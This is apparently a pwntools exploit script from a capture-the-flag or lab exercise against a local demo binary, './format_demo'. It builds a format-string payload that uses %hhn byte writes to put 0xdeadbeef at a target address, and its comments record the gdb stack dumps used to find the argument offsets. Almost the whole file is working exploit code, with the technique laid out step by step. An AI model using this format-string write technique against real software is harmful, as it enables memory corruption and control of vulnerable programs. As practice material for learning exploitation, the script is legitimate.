from pwn import *

# p = process("./format_demo")

context.terminal

address = 0x404038

gdb_script = f"""
b *echo
b *echo+52
b *echo+57
"""

# de   ad     be     ef
# 222  173    190    239
# 256 == 0x100
# 0xef + x = 0x100 + y = 0x1be
#
#
# + 0xbe

payload = b""
# offset = 18
# payload = 8 * b"A" + b"|" + b"".join(f"{i}: %p|".encode() for i in range(1, 30))

payload += b"%239c%24$hhn"
payload += f"%{(256 - 0xef)+0xbe}c%25$hhn".encode()
payload += f"%{(256 - 0xbe)+0xad}c%26$hhn".encode()
payload += f"%{0xde-0xad}c%27$hhn".encode()
payload = payload.ljust(48, b"\x01")
payload += p64(address)
payload += p64(address + 1)
payload += p64(address + 2)
payload += p64(address + 3)

# Reasons for offset:
# Step 1) Find offset
# AAAAAAAA|0: 0x2742e2a1|1: 0xfbad2088|2: 0xd8bd1d5f|3: 0x2742e372|4: (nil)|5: 0x7ffe8b390630|
# 6: 0x7ffe8b390660|7: 0x7ffe8b390a50|8: 0x401278|9: 0x7ffe8b390b68|10: 0x18b390770|
# 11: 0x65726365535f5f5f|12: 0x6f77737361505f74|13: 0x65726f74535f6472|14: 0x6174535f6e6f5f64|15: 0x5f5f5f6b63|16: 0x7fa62564dcd8
# 17: 0x4141414141414141|18: 0x317c7025203a307c|
# print(payload)

# Step 2) Find offset for addresses! It has changed since we know our positional is 17! See below
# command: Stack 30
# offset = 18 | 0c:0060│ rdi 0x7ffdb3da4d10 ◂— 0x3432256339333225 ('%239c%24')
# offset = 19 | 0d:0068│+058 0x7ffdb3da4d18 ◂— 0x373032256e686824 ('$hhn%207')
# offset = 20 | 0e:0070│+060 0x7ffdb3da4d20 ◂— 0x6e68682435322563 ('c%25$hhn')
# offset = 21 | 0f:0078│+068 0x7ffdb3da4d28 ◂— 0x3632256339333225 ('%239c%26')
# offset = 22 | 10:0080│+070 0x7ffdb3da4d30 ◂— 0x633934256e686824 ('$hhn%49c')
# offset = 23 | 11:0088│+078 0x7ffdb3da4d38 ◂— 0x16e686824373225
# offset = 24 | 12:0090│+080 0x7ffdb3da4d40 —▸ 0x404038 (target) ◂— 0x2a /* '*' */
# offset = 25 | 13:0098│+088 0x7ffdb3da4d48 —▸ 0x404039 (target+1) ◂— 0xe000000000000000
# offset = 26 | 14:00a0│+090 0x7ffdb3da4d50 —▸ 0x40403a (target+2) ◂— 0x18e0000000000000
# offset = 27 | 15:00a8│+098 0x7ffdb3da4d58 —▸ 0x40403b (target+3) ◂— 0x8418e00000000000
# offset = 28 | 16:00b0│+0a0 0x7ffdb3da4d60 —▸ 0x7f7c5366000a ◂— 0x894000008910000

p = gdb.debug("./format_demo", gdbscript=gdb_script)


p.sendline(payload)
p.interactive()
